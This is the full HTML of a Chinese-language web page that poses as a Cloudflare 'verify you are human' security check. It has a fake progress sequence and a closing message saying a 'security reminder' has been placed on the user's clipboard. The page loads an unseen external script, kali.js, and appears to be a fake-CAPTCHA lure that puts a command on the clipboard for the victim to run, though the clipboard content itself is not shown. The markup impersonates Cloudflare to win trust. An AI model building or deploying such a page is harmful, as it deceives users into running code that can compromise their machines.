<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安全检查中...</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #e0e0e0; user-select: none; }
        .container { width: 100%; max-width: 420px; padding: 20px; }
        .card { background: #0d0d0d; border: 1px solid #222; border-radius: 12px; padding: 40px 30px; text-align: center; box-shadow: 0 0 20px rgba(0,102,255,0.05); }
        .logo { font-size: 20px; font-weight: 600; color: #fff; margin-bottom: 30px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .logo svg { width: 22px; height: 22px; }
        .logo span { background: #fff; color: #000; padding: 2px 10px; border-radius: 4px; font-size: 16px; font-weight: 700; }
        .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #0066ff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        h2 { font-size: 18px; font-weight: 500; color: #fff; margin-bottom: 8px; }
        p { color: #aaa; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
        .progress-bar { width: 100%; height: 4px; background: #222; border-radius: 2px; margin: 20px 0; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #0066ff; border-radius: 2px; transition: width 0.3s linear; }
        .status-text { font-size: 13px; color: #666; margin-bottom: 5px; }
        .footer { margin-top: 30px; font-size: 12px; color: #555; display: flex; align-items: center; justify-content: center; gap: 6px; }
        .footer svg { width: 10px; height: 10px; }
        .hidden { display: none; }
        .success-icon { width: 50px; height: 50px; margin: 0 auto 20px; border-radius: 50%; background: #00cc66; display: flex; align-items: center; justify-content: center; font-size: 28px; color: #fff; }
        .btn {
            background: transparent;
            color: #fff;
            border: 1px solid #fff;
            padding: 12px 30px;
            border-radius: 2px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s, border-color 0.2s;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            min-width: 200px;
        }
        .btn:hover { background: rgba(255,255,255,0.1); }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        .btn .btn-text { display: inline; }
        .btn .btn-spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid #fff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .btn.loading .btn-text { display: none; }
        .btn.loading .btn-spinner { display: inline-block; }
        #countdown {
            margin-top: 15px;
            font-size: 16px;
            color: #aaa;
            min-height: 20px;
            transition: opacity 0.2s;
        }
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .modal-box {
            background: #111;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 25px;
            max-width: 320px;
            text-align: center;
            color: #fff;
        }
        .modal-box h3 { margin-bottom: 15px; font-size: 18px; }
        .modal-box p { font-size: 13px; color: #aaa; margin-bottom: 15px; }
        .modal-actions { display: flex; gap: 10px; justify-content: center; }
        .modal-actions button {
            background: #0066ff;
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 14px;
        }
        .modal-actions button.secondary {
            background: transparent;
            border: 1px solid #555;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="card" id="verifyStep">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2L2 7L12 12L22 7L12 2Z" fill="#fff"/>
                    <path d="M2 17L12 22L22 17" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M2 12L12 17L22 12" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                <span>CF</span> Cloudflare
            </div>
            <h2>安全检查</h2>
            <p>点击下方按钮完成安全验证，并获取安全提醒。</p>
            <button class="btn" id="verifyBtn" onclick="startCheck()">
                <span class="btn-text">确认您是真人</span>
                <span class="btn-spinner"></span>
            </button>
            <div id="countdown"></div>
            <div class="footer">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                DDoS 攻击防护 · Cloudflare
            </div>
        </div>

        <div class="card hidden" id="checkStep">
            <div class="spinner"></div>
            <h2 id="progressText">正在验证浏览器环境...</h2>
            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
            <p id="progressDesc">请勿关闭或刷新此页面</p>
            <div class="status-text" id="stepCounter">步骤 1/25</div>
        </div>

        <div class="card hidden" id="doneStep">
            <div class="success-icon">✓</div>
            <h2>检查已完成</h2>
            <p>安全提醒已写入您的剪贴板，请注意查收。</p>
            <div class="footer">谢谢您的配合</div>
        </div>
    </div>


    <!-- 引入外部 JavaScript 文件 -->
    <script src="kali.js"></script>
</body>
</html>
